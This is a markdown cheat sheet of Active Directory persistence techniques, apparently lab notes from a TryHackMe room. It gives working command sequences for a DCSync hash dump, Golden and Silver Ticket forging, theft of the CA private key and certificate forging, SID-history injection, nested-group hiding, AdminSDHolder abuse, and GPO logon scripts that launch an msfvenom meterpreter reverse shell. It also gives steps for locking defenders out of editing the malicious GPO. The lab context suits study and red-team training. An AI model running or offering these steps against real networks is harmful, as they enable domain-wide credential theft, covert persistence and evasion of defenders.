## 🔄 Active Directory Persistence: DC Sync

Domain replication utilizes the Knowledge Consistency Checker (KCC) to generate a replication topology for the Active Directory (AD) forest. It automatically connects domain controllers (DCs) via Remote Procedure Calls (RPC) to synchronize information such as password updates and new objects.  Authentication delays following password changes occur due to the propagation time across this topology.

The objective is to establish persistence using near-privileged credentials to maintain execution capabilities without requiring full domain compromise. Target the following credential types:
1. Credentials with local administrator rights distributed across multiple machines (workstation or server admin groups).
2. Service accounts possessing delegation permissions to facilitate Kerberos delegation attacks (Golden/Silver tickets).
3. Accounts managing privileged AD services (Exchange, Windows Server Update Services (WSUS), or System Center Configuration Manager (SCCM)).

```bash
# Extract Active Directory password hashes via DCSync
log <username>_dcdump.txt
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
lsadump::dcsync /domain:za.tryhackme.loc /all
```
* Tool: Mimikatz

## 🎫 Persistence Through Tickets

### Golden Tickets
Golden Tickets are forged Ticket Granting Tickets (TGTs). This bypasses the initial verification steps of the Kerberos authentication process.  Generating a Golden Ticket requires the KRBTGT account's password hash.

Technical characteristics:
* Target account password hashes are not required. Verification relies solely on the KDC validation of the KRBTGT signature.
* KDC validates the user account in the TGT only if the timestamp is older than 20 minutes. Disabled, deleted, or non-existent accounts can be utilized if the timestamp is within this window.
* Ticket lifetimes are defined within the TGT and can be modified to bypass standard KDC policies (e.g., extending validity to 10 years).
* The KRBTGT password does not rotate automatically. Persistence is maintained until manual rotation occurs twice (as AD retains the previous password to prevent service disruption).
* Bypasses smart card authentication requirements.
* Can be generated on non-domain-joined machines.

```bash
# Generate and inject a Golden Ticket into the current session
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```
* Tool: Mimikatz

```cmd
# Verify access using the injected Golden Ticket
dir \\thmdc.za.tryhackme.loc\c$\
```
* Tool: Windows Command Prompt

### Silver Tickets
Silver Tickets are forged Ticket Granting Service (TGS) tickets. This bypasses the KDC entirely, interfacing directly with the targeted service.

Technical characteristics:
* The TGS is signed using the target host's machine account hash.
* Scope is restricted to the specific targeted host and service, unlike the domain-wide access of a Golden Ticket.
* Operates without an associated TGT, eliminating communication with the DC and bypassing standard KDC logging mechanisms. Logs are isolated to the target server.
* Non-existent users can be utilized by injecting relevant SIDs (e.g., local administrator groups).
* Machine account passwords rotate every 30 days. Host registry modifications can disable this rotation to extend persistence.
* Machine accounts function as standard AD accounts for continued enumeration and exploitation.

```bash
# Generate and inject a Silver Ticket for CIFS access
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
* Tool: Mimikatz

```cmd
# Verify access using the injected Silver Ticket
dir \\thmserver1.za.tryhackme.loc\c$\
```
* Tool: Windows Command Prompt

## 📜 Persistence Through Certificates

A valid certificate capable of Client Authentication can be used to request a TGT. This persists regardless of account password rotations and remains effective until the certificate expires or is explicitly revoked.  

To maximize persistence, target the root Certificate Authority (CA). Compromising the root CA's private key allows the generation of arbitrary certificates that the blue team cannot track or natively revoke without rotating the entire CA infrastructure.

```bash
# Patch local cryptography APIs and export the CA private key
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
```
* Tool: Mimikatz

The exported certificate (`za-THMDC-CA.pfx`) is encrypted using the default password `mimikatz`.

```powershell
# Forge a new Client Authentication certificate using the stolen CA key
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```
* Tool: ForgeCert

```cmd
# Request a TGT using the forged certificate
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```
* Tool: Rubeus

## 📖 Persistence Through SID History

SID History can be manipulated to include SIDs from the current domain, elevating privileges without altering direct group memberships. 

Technical characteristics:
* Requires Domain Admin equivalent privileges to execute.
* SIDs (including group SIDs) injected into SID history are added to the user's access token upon authentication, granting corresponding privileges.
* Injecting the Enterprise Admin SID grants effective Domain Admin rights across the entire forest.
* The account maintains a benign appearance (e.g., standard Domain User) while holding hidden administrative privileges.

```powershell
# Enumerate current SID history and target group SIDs
Get-ADUser <your ad username> -properties sidhistory,memberof
Get-ADGroup "Domain Admins"
```
* Tool: PowerShell AD Module

```powershell
# Stop NTDS service, patch NTDS.dit directly to add SID history, and restart service
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName '<low-privileged AD account>' -SidHistory '<Target SID>' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds  
```
* Tool: DSInternals

## 👥 Persistence Through Group Membership

Direct addition to highly monitored groups (Domain Admins) increases detection risk. Persistence can be obscured through indirect privileges or nested group memberships.
* IT Support groups grant password reset capabilities, facilitating lateral movement.
* Server/Workstation local administrator groups bypass central AD security monitoring.
* Groups owning Group Policy Objects (GPOs) provide indirect administrative control.

```powershell
# Create multiple nested groups to obfuscate the persistence path
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
# Repeat nesting structure for multiple levels...
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```
* Tool: PowerShell AD Module

```cmd
# Verify access granted via nested group architecture
dir \\thmdc.za.tryhackme.loc\c$\ 
```
* Tool: Windows Command Prompt

## 🛡️ Persistence Through Access Control Lists

### AdminSDHolder and SDProp
Direct group modifications can be remediated by defenders. Modifying Active Directory templates ensures unauthorized permissions are automatically restored. 

The AdminSDHolder container ACL acts as a template for all protected AD groups. The Security Descriptor Propagator (SDProp) process overwrites the ACLs of all protected groups to match the AdminSDHolder template every 60 minutes. Injecting an Access Control Entry (ACE) into AdminSDHolder grants persistent, auto-restoring access to all protected groups.

```powershell
# Manually trigger the SDProp process to apply AdminSDHolder modifications immediately
Import-Module .\Invoke-ADSDPropagation.ps1 
Invoke-ADSDPropagation
```
* Tool: PowerShell

### Group Policy Objects (GPOs)
GPOs can establish domain-wide persistence via mechanisms such as Restricted Group Membership (forcing local admin assignments) or Logon Script Deployment (triggering callbacks upon user authentication). 

Preparation requires a malicious payload and a trigger script. 

```bash
# Generate reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
```
* Tool: MSFvenom

```bat
# Create logon script to stage and execute the payload
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
```
* Tool: Batch Script

```bash
# Transfer payload and script to SYSVOL
scp <username>_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp <username>_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```
* Tool: SCP

Execution methodology:
1. Link GPO to target Organizational Unit (OU) (e.g., Admins OU).
2. Set GPO to `Enforced` to override conflicting defensive policies.
3. Configure User Configuration -> Policies -> Windows Settings -> Scripts (Logon/Logoff).
4. Add the batch script payload.
5. Modify GPO delegation: Remove default administrator edit permissions, leaving only malicious/controlled accounts with modification capabilities to harden the persistence.
